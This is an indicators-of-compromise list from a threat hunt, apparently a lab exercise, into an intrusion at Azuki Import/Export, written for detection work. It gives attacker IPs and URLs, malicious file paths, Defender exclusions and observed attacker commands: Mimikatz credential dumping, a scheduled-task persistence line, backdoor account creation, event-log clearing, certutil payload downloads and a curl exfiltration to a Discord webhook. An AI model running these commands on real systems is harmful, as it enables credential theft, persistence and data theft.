# AZUKI BREACH Threat Hunt - Part 1: Indicators of Compromise (IOCs)

This document contains all Indicators of Compromise identified during the Part 1 threat hunt investigation of the JADE SPIDER intrusion at Azuki Import/Export Trading Co.

---

## Network Indicators

### External IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 88.97.178.12 | Initial access source | First unauthorized RDP connection |
| 78.141.196.6 | Attacker-controlled server | Malware staging and C2 server |

### Internal IP Addresses

| IP Address | Description | Context |
|------------|-------------|---------|
| 10.1.0.188 | Lateral movement target | Secondary system accessed via RDP |

### Ports

| Port | Protocol | Description |
|------|----------|-------------|
| 443 | HTTPS | C2 communication |
| 8080 | HTTP | Malware download |

### URLs

| URL | Description |
|-----|-------------|
| http://78.141.196.6:8080/wupdate.ps1 | Malicious PowerShell script |
| http://78.141.196.6:8080/wupdate.bat | Malicious batch script |
| http://78.141.196.6:8080/svchost.exe | Malware payload |
| http://78.141.196.6:8080/AdobeGC.exe | Mimikatz (credential theft tool) |
| https://discord.com/api/webhooks/* | Data exfiltration endpoint |

---

## Host-Based Indicators

### Malicious Files

| Filename | Path | Description |
|----------|------|-------------|
| svchost.exe | C:\ProgramData\WindowsCache\svchost.exe | Malware disguised as system process |
| mm.exe | C:\ProgramData\WindowsCache\mm.exe | Mimikatz credential theft tool |
| wupdate.ps1 | C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1 | Malicious PowerShell script |
| wupdate.bat | C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.bat | Malicious batch script |
| export-data.zip | C:\ProgramData\WindowsCache\export-data.zip | Exfiltration archive |

### Suspicious Directories

| Path | Description |
|------|-------------|
| C:\ProgramData\WindowsCache | Hidden staging directory (+h +s attributes) |

### Scheduled Tasks

| Task Name | Executable | Schedule | Run As |
|-----------|------------|----------|--------|
| Windows Update Check | C:\ProgramData\WindowsCache\svchost.exe | Daily at 02:00 | SYSTEM |

### User Accounts

| Account | Type | Description |
|---------|------|-------------|
| kenji.sato | Compromised | Initial access account (IT admin) |
| fileadmin | Compromised | Used for lateral movement |
| support | Backdoor | Created by attacker, added to Administrators |

### Registry Modifications

**Windows Defender Exclusions:**

| Registry Key | Value | Description |
|--------------|-------|-------------|
| HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions | .bat | Extension exclusion |
| HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions | .ps1 | Extension exclusion |
| HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Extensions | .exe | Extension exclusion |
| HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths | C:\Users\KENJI~1.SAT\AppData\Local\Temp | Path exclusion |
| HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths | C:\ProgramData\WindowsCache | Path exclusion |

---

## Behavioral Indicators

### Command Line Patterns

**Credential Dumping:**
```
mm.exe privilege::debug sekurlsa::logonpasswords exit
```

**Network Reconnaissance:**
```
"ARP.EXE" -a
ipconfig /all
```

**Persistence Creation:**
```
schtasks.exe /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f
```

**Account Creation:**
```
net.exe user support <password> /add
net.exe localgroup Administrators support /add
```

**Log Clearing:**
```
wevtutil.exe cl Security
wevtutil.exe cl System
wevtutil.exe cl Application
```

**Lateral Movement:**
```
cmdkey.exe /generic:10.1.0.188 /user:fileadmin /pass:<password>
mstsc.exe /v:10.1.0.188
```

**Download via Certutil:**
```
certutil.exe -urlcache -f http://78.141.196.6:8080/<filename> C:\ProgramData\WindowsCache\<filename>
```

**Data Exfiltration:**
```
curl.exe -F file=@C:\ProgramData\WindowsCache\export-data.zip https://discord.com/api/webhooks/<webhook_id>
```

---

## Notes

These IOCs are specific to the JADE SPIDER intrusion observed at Azuki Import/Export Trading Co. during November 2025. IOCs should be used in conjunction with behavioral detection rules, as sophisticated threat actors frequently change infrastructure and file names between operations.

**Last Updated:** January 8, 2026
